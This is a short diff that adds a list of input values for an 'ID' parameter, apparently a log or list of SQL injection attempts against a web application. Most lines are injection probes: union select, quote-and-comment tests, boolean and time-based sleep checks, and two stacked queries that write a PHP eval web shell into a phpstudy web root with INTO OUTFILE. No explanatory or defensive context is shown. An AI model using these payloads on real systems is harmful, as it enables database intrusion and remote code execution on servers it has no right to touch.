@@ -1,0 +1,27 @@
+ID:1
+ID:10
+ID:-1' union select 1,2,3 -- 
+ID:1'
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1;
+ID:1;1=1
+ID:1;sleep(0);
+ID:1;sleep(10);
+ID:1;select '<?PHP @eval($_POST["pass"]);?>' into outfile 'D:\\phpstudy\\PHPTutorial\\WWW\\x.php' ;
+ID:1;select '<?PHP @eval($_POST["pass"]);?>' into outfile 'D:\\phpstudy\\PHPTutorial\\WWW\\x.php' -- 
+ID:1'
+ID:1'-- 
+ID:1"
+ID:1"-- 
+ID:1")-- 
+ID:1")and 1=1-- 
+ID:1")and 1=2-- 
